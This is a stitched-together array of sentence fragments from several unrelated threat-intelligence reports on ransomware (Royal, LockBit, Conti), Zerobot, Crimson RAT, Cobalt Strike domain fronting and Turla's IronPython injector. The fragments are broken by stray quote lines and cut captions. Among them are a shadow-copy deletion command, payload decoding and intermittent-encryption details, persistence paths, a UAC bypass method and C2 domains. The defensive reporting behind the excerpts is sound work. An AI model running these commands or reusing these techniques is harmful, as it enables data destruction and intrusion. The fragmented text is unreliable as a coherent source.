            "Looking for accessible local IPs then trying to connect to ADMIN$ and IPC$ It checks for the number of processors in the infected system and uses it as a base for the concurrent running threads for file encryption, as shown in Figure 7.",
            "By doing so, Royal ransomware significantly increases the speed of its file encryption process. ",
            "Figure 7.",
            "Checking the number of processors Royal ransomware inhibits system recovery by deleting shadow copies (Figure 8) through the following command: C:\\\\Windows\\\\System32\\\\vssadmin.exe delete shadows /all",

            "An RSA public key Figure 10.",
            "Generation of AES Key and IV The malicious actors behind Royal ransomware use a form of intermittent encryption tactic to speed their encryption process: the ransomware first checks if the file size is divisible by 16, which is a requirement for AES (Figure 11).",
            "If not, it rounds up the total size until it is divisible by 16.",
            "For example, if the size is 18, it will append zero bytes to the file until it has a size of 32, which is now divisible by 16.",
            "Aside from appending the needed zero bytes, it also appends an extra 0x210 Zero bytes as a placeholder for the appended RSA encrypted key. Figure 11.",
            "Royal ransomware checking if file size is divisible by 16 ",
            "For a file size that has been rounded-up, Royal ransomware will check if the size is less than or equal to 5,245,000 bytes or if the value is set to 100 (0x64), as shown in Figure 12.",
            "If the file size is within these limits, it will encrypt the entire file.",
            "For files greater than 5,245,000 bytes, file encryption will take place per certain calculated blocks: for example, it will encrypt first N bytes, then skip the next N bytes, then encrypt the next N bytes, and so on. Figure 12.",
            "Encryption process and calculation Its calculation of N bytes is as follows: X / 10* (Original file size) & 0xFFFFFFF0 where X is the value set before encryption X is either 0x32 (50) or 0x64 (100) ",
            "This value will also be used as indicator if full encryption or partial encryption will be performed on the file For example, with a file with a file size equal to 5,245,000: N = 50/10 * (5245000 / 100) & 0xFFFFFFF0 = 0x40060 (262240) ",
            "If the calculated N is greater than 1,024,000, it will simply encrypt per 1,024,000 block instead (Figure 13). ",

",
            "Since the war with Russia began, Ukraine\u2019s energy sector has been under constant cyberattack.",
            "For example, in April 2022, an attack deploying INDUSTROYER2 and CADDYWIPER wiper malware targeted energy companies.",
            "On 16 August 2022, the Energoatom corporate website was the target of a DDoS attack.",
            "And in October 2022, yet another wiper attack, this one using the wiper dubbed NikoWiper, targeted the energy sector. ",
            "Aside from highlighting the technical details of this latest multi-staged attack, which includes several evasion techniques, this article also discusses some strange artifacts that make us think this could be a work-in-progress or part of a red-team exercise. ",
            "Document Analysis The macro-enabled document is named \u201czatverdzhenniy_spisok_osib_na_otrim\u201d, which roughly translates to \u201capproved list of persons to receive\u201d in Ukrainian.",

            "In a likely attempt to make the location of the macro code less obvious, the VBA Project binary file that contains the actual VBA code is redirected to the file \u201cEbDYTPZ.vEypm\u201d instead of the default \u201cvbaProject.bin\u201d. ",

",
            "As mentioned, the macro begins by deleting the overlay image, which is internally a Shape object with the Name attribute \u201chappy\u201d.",
            "To find this image, it iterates through all the Shape objects in the document and deletes the one with the same name. ",
            "To hide the strings it uses during its execution, it primarily uses a simple encoding by subtracting 35 from each character of the original string and encoding the result with Base64.",
            "In addition, it uses other operations, such as string reverse and character splitting, prior to decoding. ",

            "Below is a screenshot of the encoded payload stored in \u201ccustomXml\\item1.xml\u201d of the document archive (Figure 4). ",
            "Figure 4: Encoded binary payload Although the payload in this document is stored in a single node, the VBA code also supports an encoded payload split across several nodes, further complicating its extraction.",
            "In fact, before assuming that the data is stored in a single node, it first checks to determine whether it is stored in several nodes.",
            "It does this by trying to find the node name, in this case, \u201cTwXfx\u201d, with an appended index, i.e., \u201cTwXfx_0\u201d.",
            "If the node exists, it moves on to find the next one by incrementing the index (i.e., TwXfx_1).",
            "It repeats this until it fails to find a node, which means it has reached the end of the payload. ",
            "Once a node is found, the content of the node is read, and its XML tags are removed.",
            "Furthermore, if a string \u201c__b_\u201d is found at the beginning of the data, it is also removed.",
            "Similar to decoding strings, the binary payload is extracted by decoding the data using Base64 and adding 35.",
            "Only this time, the resulting bytes are further decoded with xor 82.",
            "The decoded payload is a 64-bit executable (.exe). ",

            "The website author offers a private tool that provides similar capabilities.",
            "Still, the creator of this malicious document could have easily replicated the technique from the publicly available PoC linked in the blog.",
            "Figure 5 shows one of the several code similarities observed in the function for locating the payload node in the document. ",

            "In addition could be interesting to note that, according to the visibility we can dispose of, limited telemetry hits related to the collected artifacts have been catched on 25/08/2022 and 09/09/2022 from two countries of the European Union (we have no data available before 25/08/2022). ",
            "Such recent evidence could suggest some sort of activities still ongoing linked to the described threat or to some of its variants.",

            "LockBit has been one of the more dangerous ransomware, active since 2019.",
            "It was part of several successful attacks against a large variety of industries, including critical infrastructure. ",
            "This blog post discusses the infection chain and Tactics, Techniques, and Procedures (TTPs) of this campaign. ",
            "Overview Descriptions of the attack refer to the stages outlined in Figure 1 below.",
            "The attack starts with a .img container (1) and a social engineering technique of displaying a single file once it\u2019s mounted while hiding the rest of its files from the user.",
            "It can also cause malware analysts to miss the payloads while examining the samples manually. ",

            "In some of the cases that we\u2019ve observed, a python script is executed (2.1) using the official Python embed package.",
            "The only purpose of the script is to run the subsequent BAT scripts.",
            "Some variants used a known UAC bypass method abusing the legitimate fodhelper.exe (3.1).",
            "This enables the attacker\u2019s BAT file to run in a new elevated process without the user\u2019s approval. ",
            "Figure 3: UAC bypass implementation. ",

            "2. Copies its files to C:\\ProgramData. ",

            "title: Conti Ransomware url: https://thedfirreport.com/2021/05/12/conti-ransomware/ Introduction First seen in May 2020, Conti ransomware has quickly become one of the most common ransomware variants, according to Coveware.",
            "As per Coveware\u2019s Quarterly Ransomware Report (Q1 2021), Conti has the 2nd highest market share after Sodinokibi, which we wrote about here. ",
            "In April, we saw a threat actor go from an initial IcedID infection to deploying Conti ransomware domain wide in two days and 11 hours.",
            "The threat actors stayed dormant for most of this time, before jumping into action on an early Saturday morning.",
            "The hands on keyboard activity lasted for two and a half hours.",
            "They utilized RDP, PsExec, and Cobalt Strike to move laterally within the environment before executing Conti in memory across all active systems. ",
            "Summary We assess with moderate confidence that the initial vector used by the threat actor was a zip file, which included a malicious JavaScript file, delivered through a phishing campaign.",
            "The JavaScript file would eventually download and execute the IcedID malware.",
            "Discovered in 2017, what started as a commodity malware is now currently being deployed as an initial access broker by ransomware threat actors. ",
            "While there was some initial discovery activity from the IcedID malware, it went quiet, just beaconing to command and control but not performing any other activity.",
            "After being dormant for over two days, a Cobalt Strike Beacon was dropped and executed on the system infected with IcedID.",
            "The threat actors then ran another round of discovery activity with native windows utilities such as nltest.exe, whoami.exe, and net.exe.",
            "They then successfully escalated to SYSTEM privileges via Cobalt Strike\u2019s built-in \u201cnamed pipe impersonation\u201d (GetSystem) functionality. ",
            "The threat actors continued by moving laterally to the domain controllers on the network using SMB to transfer and execute a Cobalt Strike Beacon.",
            "During that time, we observed port scanning activity from one of the domain controllers, to identify open ports such as SSH, SMB, MSSQL, RDP and WinRM.",
            "After a brief gap of 15 minutes, the threat actors used PsExec, to copy and execute a Cobalt Strike Beacon DLL on most of the systems in the network. ",
            "Later in the attack, the threat actor was seen establishing RDP connections from the beachhead host to the domain controller and other systems throughout the environment.",
            "This RDP activity was being proxied through the IcedID process running on that host, to a remote proxy over port 8080. ",
            "To establish persistence, the attackers created a new local user on one of the domain controllers and added it to the Administrators group.",
            "Additionally, in an effort to evade any detection and prevention mechanisms, they disabled Windows Defender via a group policy modification. ",
            "Within two and a half hours of Cobalt Strike showing up in the environment and just over two days after the initial IcedID infection, the threat actors completed their objective of encrypting all systems.",
            "Conti was executed in memory with the help of the Cobalt Strike Beacons domain wide.",
            "The ransomware note left by the infection included a link to their Tor site for further details. ",
            "After further review of the environment (post encryption), we realized multiple systems (including a domain controller) were unable to be accessed and would not have been restorable even if the ransom had been paid. ",
            "Services We offer multiple services including a Threat Feed service which tracks Cobalt Strike, Metasploit, Empire, PoshC2, etc.",
            "More information on this service and others can be found here. ",
            "We also have artifacts available from this case such as pcaps, memory captures, files, Kape packages, and more, under our Security Researcher and Organization services. ",
            "Timeline Analysis and reporting completed by @pigerlin, @MetallicHack, @yatinwad, and 1 unnamed contributor. ",
            "Reviewed by @kostastsale, @RoxpinTeddy, and @TheDFIRReport MITRE ATT&CK Initial Access The IcedID DLL that we executed was most likely dropped through a zip file, which included a JavaScript file within it.",

            "Threat actors target Internet of Things (IoT) devices for recruitment into malicious operations as IoT devices\u2019 configurations often leave them exposed, and the number of internet-connected devices continue to grow.",
            "Recent trends have shown that operators are redeploying malware for a variety of distributions and objectives, modifying existing botnets to scale operations and add as many devices as possible to their infrastructure. ",
            "Zerobot, a Go-based botnet that spreads primarily through IoT and web application vulnerabilities, is an example of an evolving threat, with operators continuously adding new exploits and capabilities to the malware.",
            "The Microsoft Defender for IoT research team has been monitoring Zerobot (also called ZeroStresser by its operators) for months.",
            "Zerobot is offered as part of a malware as a service scheme and has been updated several times since Microsoft started to track it.",
            "One domain with links to Zerobot was among several domains associated with DDoS-for-hire services seized by the FBI in December 2022. ",
            "Microsoft has previously reported on the evolving threat ecosystem.",
            "The shift toward malware as a service in the cyber economy has industrialized attacks and has made it easier for attackers to purchase and use malware, establish and maintain access to compromised networks, and utilize ready-made tools to perform their attacks.",
            "We have tracked advertisements for the Zerobot botnet on various social media networks in addition to other announcements regarding the sale and maintenance of the malware, as well as new capabilities in development. ",
            "In this blog post, we present information about the latest version of the malware, Zerobot 1.1, including newly identified capabilities and further context to Fortinet\u2019s recent analysis on the threat.",
            "Zerobot 1.1 increases its capabilities with the inclusion of new attack methods and new exploits for supported architectures, expanding the malware\u2019s reach to different types of devices.",
            "In addition to these findings, we\u2019re sharing new indicators of compromise (IOCs) and recommendations to help defenders protect devices and networks against this threat. ",
            "What is Zerobot? Zerobot affects a variety of devices that include firewall devices, routers, and cameras, adding compromised devices to a distributed denial of service (DDoS) botnet.",
            "Using several modules, the malware can infect vulnerable devices built on diverse architectures and operating systems, find additional devices to infect, achieve persistence, and attack a range of protocols.",
            "Microsoft tracks this activity as DEV-1061. ",
            "The most recent distribution of Zerobot includes additional capabilities, such as exploiting vulnerabilities in Apache and Apache Spark (CVE-2021-42013 and CVE-2022-33891 respectively), and new DDoS attack capabilities. ",
            "Microsoft uses DEV-#### designations as a temporary name given to an unknown, emerging, or developing cluster of threat activity, allowing Microsoft to track it as a unique set of information until we can reach high confidence about the origin or identity of the actor behind the activity.",
            "Once it meets defined criteria, a DEV group is converted to a named actor. ",
            "How Zerobot gains and maintains device access IoT devices are often internet-exposed, leaving unpatched and improperly secured devices vulnerable to exploitation by threat actors.",
            "Zerobot is capable of propagating through brute force attacks on vulnerable devices with insecure configurations that use default or weak credentials.",
            "The malware may attempt to gain device access by using a combination of eight common usernames and 130 passwords for IoT devices over SSH and telnet on ports 23 and 2323 to spread to devices.",
            "Microsoft researchers identified numerous SSH and telnet connection attempts on default ports 22 and 23, as well as attempts to open ports and connect to them by port-knocking on ports 80, 8080, 8888, and 2323. ",
            "In addition to brute force attempts on devices, Zerobot exploits dozens of vulnerabilities, which malware operators add on a rolling basis to gain access and inject malicious payloads.",
            "Zerobot 1.1 includes several new vulnerabilities, such as: VulnerabilityAffected softwareCVE-2017-17105Zivif PR115-204-P-RSCVE-2019-10655GrandstreamCVE-2020-25223WebAdmin of Sophos SG UTMCVE-2021-42013ApacheCVE-2022-31137Roxy-WICVE-2022-33891Apache SparkZSL-2022-5717MiniDVBLinuxSince the release of Zerobot 1.1, the malware operators have removed CVE-2018-12613, a phpMyAdmin vulnerability that could allow threat actors to view or execute files.",
            "Microsoft researchers have also identified that previous reports have used the vulnerability ID \u201cZERO-32906\u201d for CVE-2018-20057, \u201cGPON\u201d for CVE-2018-10561, and \u201cDLINK\u201d for CVE-2016-20017; and that CVE-2020-7209 was mislabeled as CVE-2017-17106 and CVE-2022-42013 was mislabeled as CVE-2021-42013. ",
            "Microsoft researchers have also found new evidence that Zerobot propagates by compromising devices with known vulnerabilities that are not included in the malware binary, such as CVE-2022-30023, a command injection vulnerability in Tenda GPON AC1200 routers. ",
            "Upon gaining device access, Zerobot injects a malicious payload, which may be a generic script called zero.sh that downloads and attempts to execute Zerobot, or a script that downloads the Zerobot binary of a specific architecture.",
            "The bash script that attempts to download different Zerobot binaries tries to identify the architecture by brute-force, attempting to download and execute binaries of various architectures until it succeeds, as IoT devices are based on many computer processing units (CPUs).",
            "Microsoft has observed scripts targeting various architectures including ARM64, MIPS, and x86_64. ",
            "Depending on the operating system of the device, the malware has different persistence mechanisms.",
            "Persistence tactics are used by malware operators to obtain and maintain access to devices.",
            "While Zerobot is unable to spread to Windows machines, we have found several samples that can run on Windows.",
            "On Windows machines, the malware copies itself to the Startup folder with the file name FireWall.exe",
            "(older versions use my.exe).",
            "Microsoft Defender for Endpoint detects this malware and related malicious activity on both Windows and Linux devices.",
            "See detection details below. ",
            "To achieve persistence on Linux-based devices, Zerobot uses a combination of desktop entry, daemon, and service methods: Desktop entry: Zerobot copies itself to $HOME/.config/ssh.service/sshf then writes a desktop entry file called sshf.desktop to the same directory.",
            "Older Linux versions use $HOME/.config/autostart instead of $HOME/.config/ssh.service. ",
            "Daemon: Copies itself to /usr/bin/sshf and writes a configuration at /etc/init/sshf.conf. ",
            "Service: Copies itself to /etc/sshf and writes a service configuration at /lib/system/system/sshf.service, then enables the service (to make sure it starts at boot) with two commands: systemctl enable sshf service enable sshf All persistence mechanisms on older Linux versions use my.bin and my.bin.desktop instead of sshf and sshf.desktop. ",
            "New attack capabilities ",
            "In addition to the functions and attacks included in previous versions of the malware, Zerobot 1.1 has additional DDoS attack capabilities.",
            "These functions allow threat actors to target resources and make them inaccessible.",
            "Successful DDoS attacks may be used by threat actors to extort ransom payments, distract from other malicious activities, or disrupt operations.",
            "In almost every attack, the destination port is customizable, and threat actors who purchase the malware can modify the attack according to their target. ",

            "How Zerobot spreads After persistence is achieved, Zerobot scans for other internet-exposed devices to infect.",
            "The malware randomly generates a number between 0 and 255 and scans all IPs starting with this value.",
            "Using a function called new_botnet_selfRepo_isHoneypot, the malware tries to identify honeypot IP addresses, which are used by network decoys to attract cyberattacks and collect information on threats and attempts to access resources.",
            "This function includes 61 IP subnets, preventing scanning of these IPs. ",
            "Microsoft researchers also identified a sample that can run on Windows based on a cross-platform (Linux, Windows, macOS) open-source remote administration tool (RAT) with various features such as managing processes, file operations, screenshotting, and running commands.",

            "TrueBot, otherwise known as Silence.",

",
            "We assess that this activity is part of the group\u2019s previously reported targeting of the education sector in the Indian subcontinent. ",
            "We observed APT36 introducing OLE embedding to its typically used techniques for staging malware from lure documents and versioned changes to the implementation of Crimson RAT, indicating the ongoing evolution of APT36\u2019s tactics and malware arsenal. ",
            "Overview SentinelLabs has been tracking a recently disclosed cluster of malicious Office documents that distribute Crimson RAT, used by the APT36 group (also known as Transparent Tribe) targeting the education sector.",
            "This post summarizes our observations highlighting the group\u2019s continuous change in used malware staging techniques and Crimson RAT implementations. ",
            "Transparent Tribe is a suspected Pakistan-based threat group active since at least 2013.",
            "The group is not very sophisticated; however, it is a highly persistent threat actor that continuously adapts its operational strategy.",
            "Transparent Tribe has previously focused mainly on Indian military and government personnel, but it has recently expanded its scope to include educational institutions and students in the Indian subcontinent.",
            "Crimson RAT is a consistent staple in the group\u2019s malware arsenal the adversary uses in its campaigns. ",
            "The names and content of the lure documents, the associated domains, and the use of Crimson RAT suggest that the activities discussed in this post are part of a previously reported broader targeting of the education sector by Transparent Tribe. ",
            "Further, the PDB paths of some Crimson RAT samples we analyzed contain the word Wibemax, which is also contained in the PDB paths of Crimson RAT payloads observed in a previous Transparent Tribe campaign. ",
            "Wibemax matches the name of a Pakistani software development company, but at this time we have not identified a clear relationship to the adversary. ",
            "It is worth noting that there are high confidence assessments of Transparent Tribe leveraging third parties to support their operation, such as the Pakistani web hosting provider Zain Hosting. ",
            "Our analysis reinforces the assessment that closely monitoring the research endeavors of adversary nations has become an important objective for the adversary, underscoring the crucial role this activity plays in fulfilling the goals and aspirations of the authorities whose interests Transparent Tribe represents. ",
            "Malicious Documents The documents that Transparent Tribe distributes have education-themed content and names such as assignment or Assignment-no-10, and indicate creation dates of July and August 2022.",
            "Based on known behavior of this group, we suspect that the documents have been distributed to targets as attachments to phishing emails.",
            "Consistent with known Transparent Tribe tactics, we observed that some of the documents have been hosted on file hosting services and attacker-created domains, such as s1.fileditch[.]ch, cloud-drive[.]store, and drive-phone[.]online. ",
            "It is important to note that cloud-drive[.]store and drive-phone[.]online have been previously linked to Transparent Tribe activities targeting the education sector and assessed as domains prepared for future use.",
            "Further, drive-phone[.]online closely resembles the phone-drive[.]online domain recently observed hosting Transparent Tribe malware targeting Indian and Pakistani Android users. ",
            "The malicious documents we analyzed stage Crimson RAT using Microsoft Office macros or OLE embedding. ",
            "The macro code executes when the documents are opened, and its functionality is consistent with known Transparent Tribe macro variants.",
            "The macros create and decompress an embedded archive file in the %ALLUSERSPROFILE% directory (C:\\ProgramData) and execute the Crimson RAT payload within.",
            "Some macros insert text in the document, which is typically education-themed content relating to India. ",
            "Macro implementation Macro-inserted document text ",
            "In addition to macros, we observed that Transparent Tribe have adopted OLE embedding as a technique to stage Crimson RAT.",
            "Malicious documents that implement this technique require users to double-click a document element.",
            "The documents distributed by Transparent Tribe typically display an image (a \u201cView Document\u201d graphic) indicating that the document content is locked.",
            "This lures users to double-click the graphic to view the content, which activates an OLE package that stores and executes Crimson RAT masquerading as an update process (MicrosoftUpdate.exe). ",
            "The \u201cView Document\u201d graphic OLE stream that stores Crimson RAT Transparent Tribe is known to experiment with different malware staging techniques, which include distributing executables with embedded documents or documents that execute designated Crimson RAT loaders.",
            "The adoption of OLE embedding further highlights the group\u2019s continuous experimentation with malware staging techniques. ",
            "Crimson RAT Implementations We observed a variety of Crimson RAT .NET implementations, with compilation timestamps between July and September 2022.",
            "The Crimson RAT payloads we analyzed use the richa-sharma.ddns[.]net domain for C2 purposes and support either 40 or 65 commands, most of which have been documented in previous research.",
            "Features of Crimson RAT include exfiltrating system information, capturing screenshots, starting and stopping processes, and enumerating files and drives. ",
            "A Crimson RAT command dispatch routine Some Crimson RAT variants are stripped of debug information, whereas others have PDB paths that contain a date stamp, the word Richa, which relates to the configured C2 domain, and the word Wibemax.",
            "Portions of these PDB paths overlap those of Crimson RAT payloads observed in a previous Transparent Tribe campaign, such as D:\\Projects\\Wibemax\\WinP\\WinP\\obj\\Debug\\WinP.pdb and D:\\Projects\\Wibemax\\Windows RAT\\1 Windows 10 Client\\Win8P-Sunny\\2022-04-15-Win8P Sunny\\obj\\Debug\\FUJIKBattery.pdb. ",
            "Crimson RAT PDB paths We observed different Crimson RAT version identifiers: R.S.8.8., R.S.8.9, R.S.8.1, and R.S.8.6.",
            "We speculate that the R.S. components of the identifiers may relate to the configured C2 domain (richa-sharma.ddns[.]net) and the numerical components may specify a version (build) number.",
            "This aligns with a documented Crimson RAT variant with the identifier S.L.2.2., which has used the sunnyleone.hopto[.]org domain for C2 purposes. ",
            "As an anti-analysis measure, Crimson RAT variants delay their execution for a given time period, for example, 61, 180, or 241 seconds.",
            "Most of the Crimson RAT variants we analyzed evaluate whether they execute at a machine named G551JW or DESKTOP-B83U7C5 and establish persistence by creating a registry key under \\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run only if the victim\u2019s machine name differs.",
            "G551JW or DESKTOP-B83U7C5 may be the names of the machines where Crimson RAT developers have been running test executions. ",
            "Crimson RAT variants implement different obfuscation techniques of varying intensities, for example, simple function name malformation and dynamic string resolution.",
            "We observed the use of the Eazfuscator obfuscator in a Crimson RAT sample named NewOrleans.",
            "Evidence suggests that the Crimson RAT developers have patched the routine that evaluates the trial period of Eazfuscator to enable the execution of the malware after the trial period expires. ",
            "Eazfuscator trial period evaluation in NewOrleans Eazfuscator trial expiry message With previous variants of Crimson RAT obfuscated using Crypto Obfuscator, the addition of Eazfuscator to the obfuscation techniques used by Transparent Tribe highlights the continuous maintenance and development of the RAT. ",
            "Conclusion Transparent Tribe is a highly motivated and persistent threat actor that regularly updates its malware arsenal, operational playbook, and targets.",
            "Our analysis further demonstrates this characteristic of the group by spotlighting the adoption of OLE embedding as a technique for staging malware from lure documents and the Eazfuscator obfuscator to protect Crimson RAT implementations.",
            "Transparent Tribe\u2019s constantly changing operational and targeting strategies require constant vigilance to mitigate the threat posed by the group. ",

            "News Summary Cisco Talos discovered a new malicious campaign using a leaked version of Cobalt Strike in September 2021. ",
            "This shows that Cobalt Strike, although it was originally created as a legitimate tool, continues to be something defenders need to monitor, as attackers are using it to set up attacks. ",
            "The threat actor in this case uses domain fronting with the Cloudflare Content Delivery Network, redirecting a Myanmar government owned-domain to an attacker-controlled server. ",
            "The threat actor employed the tactic of re-registering reputed domains in their attack chains to evade detections. ",
            "This threat demonstrates several techniques of the MITRE ATT&CK framework, most notably T1202 - Indirect Command Execution , T1027 - Obfuscated Files or Information, T1105 - Ingress Tool Transfer, T1071.001 - Application Layer Protocols:Web Protocols. ",
            "What's New? Cisco Talos discovered a malicious campaign using an obfuscated Meterpreter stager to deploy Cobalt Strike beacons in September 2021.",
            "The actor used a domain owned and operated by the Myanmar government, the Myanmar Digital News network, as a domain front for their beacons. ",
            "The evolution of this threat indicates that the attackers have been active since at least August 2021 using a combination of Meterpreter stagers and Cobalt Strike beacons to establish presence on victim's endpoints. ",
            "How did it work? ",
            "The malware is typically a loader that runs on a victim machine, decodes and executes the Cobalt Strike beacon DLL via reflective injection.",
            "It loads several libraries during the runtime and generates the beacon traffic according to the embedded configuration file.",
            "The configuration file contains the information related to the command and control (C2) server which instructs the victim's machine to send the initial DNS request attempting to connect to the host of the Myanmar government-owned domain www[.]mdn[.]gov[.]mm.",
            "The site is hosted behind the Cloudflare content delivery network and the actual C2 traffic is redirected to an attacker controlled server test[.]softlemon[.]net based on the HTTP host header information specified in the beacon's configuration data. ",
            "So what? ",
            "Cobalt Strike has been used by many actors in the past and is a de-facto standard tool for post-exploitation activities and pivoting.",
            "Attackers use it to deploy a wide range of payloads, from commodity malware, to sophisticated state-sponsored activities. ",
            "Cobalt Strike allows actors to shape the traffic of beacons to mimic legitimate traffic patterns.",
            "One of the techniques to conceal the traffic from DNS-based filtering is Domain Fronting.",
            "Domain fronting uses legitimate or high-reputation domains to remain undetected by defenders.",
            "The attacker's choice of Myanmar-specific domains for domain fronting may indicate an interest in the geopolitics of this area of the world. ",
            "In this campaign, the actor used staged payloads using the Meterpreter stager, which gives an indication that the beacon will be used for further attacks.",
            "The defenders should be constantly vigilant and monitor network traffic to detect Cobalt Strike activities, since it is one of the most commonly used offensive tools by crimeware and APT operators. ",
            "Evolution of the campaign A study of the evolution of the campaign shows the actor experimenting with different combinations of hosts with the intent of perfecting the domain fronting technique. ",
            "The earliest beacon discovered around the middle of August 2021 contains the C2 URI set to test[.]softlemon[.]net while the HTTP Get and Post requests headers are pointing to dark-forest-002[.]president[.]workers[.]dev which is a Cloudflare serverless workers domain.",
            "The default host header configuration for request contains the host name test[.]softlemon[.]net, which is also used by more recent samples. ",
            "Another sample discovered in late August 2021 consisted of the C2 host URI xxx[.]xxxx[.]tk and the host header setting configured to point to test[.]softlemon[.]net. ",
            "Beginning September 2021, the attackers started using the Myanmar Digital News domain for fronting their beacons.",
            "While the default C2 domain was specified as www[.]mdn[.]gov[.]mm, the beacon's traffic was redirected to the de-facto C2 test[.]softlemon[.]net via HTTP Get and POST metadata specified in the beacon's configuration. ",
            "The actor likely changed the configuration to test their infrastructure and the domain fronting functionality before launching the attack.",
            "Based on the beacon configuration template and the real C2 host test[.]softlemon[.]net, we assess with moderate confidence that the samples are created by a single actor. ",
            "Timeline of malware samples first seen in the wild. ",
            "Cobalt Strike beacon configurations ",
            "We extracted the beacon config from the payload that showed us the actor has used different values for the User Agent, C2-Server and Host-header in different malwares of this campaign. ",
            "The beacon configuration of samples usually has a User Agent, which is Mozilla compatible and of Windows 7. C2 server, UserAgent and de-facto C2 variations in the beacons. ",
            "Watermark The Cobalt Strike watermark is a number generated from the license file and is unique to a Cobalt Strike license.",
            "The watermark on the beacons used in this campaign was 305419896 (hex: 0x12345678). ",
            "This particular watermark has previously been attributed to a leaked Cobalt Strike version and is unsurprisingly used by other malicious actors, such as Maze ransomware and Trickbot groups, making attribution based on the watermark number impossible.",
            "It is difficult to assess if the usage of the previously registered expired domain for C2 server and the leaked Cobalt Strike point to an increased operational security awareness of the actor or to limited resources available to them. ",
            "Domain fronting The actor in this campaign has used domain fronting, which is a technique which can use high reputation domains to conceal the Cobalt Strike command and control traffic.",
            "A government domain of Myanmar www[.]mdn[.]gov[.]mm was used in this particular instance. ",
            "The fronted domain mdn[.]gov[.]mm is a legitimate domain of Myanmar Digital News, a state-owned digital newspaper.",
            "This website has previously been compromised in February by the Brotherhood of Myanmar group, a collection of militia groups.",
            "Although there are no indications that the previous defacement of the domain by the Brotherhood of Myanmar and the campaign described in this post are related, the domain itself is clearly of interest to various actors. ",
            "Domain fronting can be achieved with a redirect between the malicious server and the target.",
            "Malicious actors may misuse various content delivery networks (CDNs) to set up redirects of serving content to the content served by attacker-controlled C2 hosts.",

",
            "We saw several variations on the ffmpeg.dll file, including one that was signed by 3CX\u2019s own certificate; these appear to be maliciously patched versions of the legitimate ffmpeg.dll.",

            "Figure 3: When ffmpeg stepped onto Twitter to defend its code In a normal DLL sideloading scenario, the malicious loader (ffmpeg.dll) would replace the clean dependency; its only function would be to queue up the payload.",

            "This not only saves the bad guys development time, but also makes it much easier for them to find new ideas to prevent detection of their malware. ",
            "Unit 42 researchers have found several malicious IronPython scripts whose purpose is to load and run Turla\u2019s malware tools on a victim\u2019s system.",
            "The use of IronPython for malicious purposes isn\u2019t new, but the way Turla uses it is new.",
            "The overall method is known as Bring Your Own Interpreter (BYOI).",
            "It describes the use of an interpreter, not present on a system by default, to run malicious code of an interpreted programming or scripting language. ",
            "The first malicious IronPython scripts of the tool we describe here were discovered last year by a security researcher from FireEye.",
            "At the beginning of this year, another security researcher from Dragos pointed out some new scripts of the same threat actor uploaded to VirusTotal from two different submitters.",
            "We found that one of the submitters also uploaded two other samples, which are most likely embedded payloads of one of the IronPython scripts.",
            "These samples helped us to understand how this tool works, what malware it loads and which threat actor uses it. ",
            "While the IronPython scripts are only the first part of the tool, the main task of loading malware is done by an embedded process injector.",
            "We dubbed this toolchain IronNetInjector, the blend of IronPython and the injector\u2019s internal project name NetInjector.",
            "In this blog, we describe the IronPython scripts and how they\u2019re used to load one or more payloads with the help of an injector. ",

            "AutoFocus customers can investigate this activity with the tag \u201cIronNetInjector\u201d. ",
            "What Is IronPython? ",
            "First, let\u2019s take a look at what IronPython is and why it was chosen as a loading vector.",
            "In the words of the IronPython team: IronPython is an open-source implementation of the Python programming language which is tightly integrated with the .NET Framework.",
            "IronPython can use the .NET Framework and Python libraries, and other",
            ".NET languages can use Python code just as easily. ",
            "And further: IronPython\u2019s sweet-spot is being able to use the .NET framework APIs directly from Python. ",
            "With IronPython, you can use .NET framework APIs directly in your Python script.",
            "It is a Python interpreter written entirely in C#.",
            "Currently, it fully supports Python 2, while support for Python 3 is still in development.",
            "As one of two official projects formerly developed by Microsoft, the other being IronRuby, it uses the Dynamic Language Runtime (DLR). ",
            "Now, it becomes clear why IronPython is also attractive for malware authors.",
            "You can make use of the .NET framework APIs without having to compile a .NET assembly.",
            "Of course, this requires the IronPython interpreter to also be present on the system, but that can be accomplished in different ways.",
            "Also, IronPython scripts don\u2019t run with the original Python interpreter when .NET framework APIs are used in the code.",
            "In case of a sandbox that supports Python scripts, the interpreter would simply crash without any dynamic analysis result.",
            "Further, as IronPython is written in C# and thus its process contains all the Common Language Runtime (CLR) on execution, one can easily load additional assemblies. ",
            "IronNetInjector IronNetInjector is made of an IronPython script that contains a .NET injector and one or more payloads.",
            "The payloads can be also .NET assemblies (x86/64) or native PEs (x86/64).",
            "When an IronPython script is run, the .NET injector gets loaded, which in turn injects the payload(s) into its own or a remote process. ",
            "The key features of the malicious IronPython scripts are as follows: Function and variable names are obfuscated. ",
            "Strings are encrypted. ",
            "Contain an encrypted .NET injector and one or more encrypted PE payloads. ",
            "Take one argument that is the decryption key for the embedded .NET injector and PE payload(s). ",
            "Embedded .NET injector and payload(s) are encoded with Base64 and encrypted with Rijndael. ",
            "Log messages are written to %PUBLIC%\\Metadata.dat Error messages are written to %PUBLIC%\\Metaclass.dat ",
            "The following screenshot shows one of the IronPython scripts decoded: Figure 1.",
            "Decoded IronPython script with embedded .NET injector and ComRAT payload (both shortened).We have found two versions of the .NET injector, a newer variant internally named NetInjector compiled in 2019 and an earlier variant named PeInjector_x64 compiled in 2018.",
            "The earlier variant is much more limited in functionality compared to the 2019 variant. ",
            "Both versions are full-blown PE injection tools able to load a native x86/64 payload reflectively into a remote process.",
            "This is accomplished via unmanaged functions and the use of PeNet, a publicly available PE parser library written in C#.",
            "The decompiled code is self-explanatory as meaningful function, method and variable names are used throughout the code.",
            "Additionally, log and error messages are being used extensively. ",
            "The 2018 variant is used within PowerShell scripts to load a payload from the same script into a process.",
            "Most of its code is taken from PowerShell Empire\u2019s ReflectivePEInjection script and got translated into C#.",
            "It\u2019s written in a much more specific manner than the 2019 variant, which is a generically written injection tool.",
            "The newer version additionally contains the ability to inject .NET assemblies into unmanaged processes.",
            "Also, it can load payloads into its own process space, the IronPython interpreter process. ",
            "The newer injector has the following PDB path left: C:\\Users\\Devel\\source\\repos\\c4\\agent\\build_tools\\agent_dll_to_Python_loader\\NetInjector\\NetInjector\\obj\\Release\\NetInjector.pdb The same submitters who uploaded the IronPython scripts also submitted other files which are directly related to IronNetInjector.",
            "Based on the file sizes and the file sizes of the embedded payloads in the IronPython scripts, we can make some assumptions about what the payloads likely are. ",

            "Both triggers only happen when these events appear in the Microsoft-Windows-GroupPolicy(/Operational) event logs. ",
            "When we consider that the files in the 7-Zip archive were all taken from the same directory, we can make some assumptions.",
            "The attacker might have used the IronPython MSI to install the interpreter to C:\\ProgramData\\IronPython-2.7 on the victim\u2019s system.",
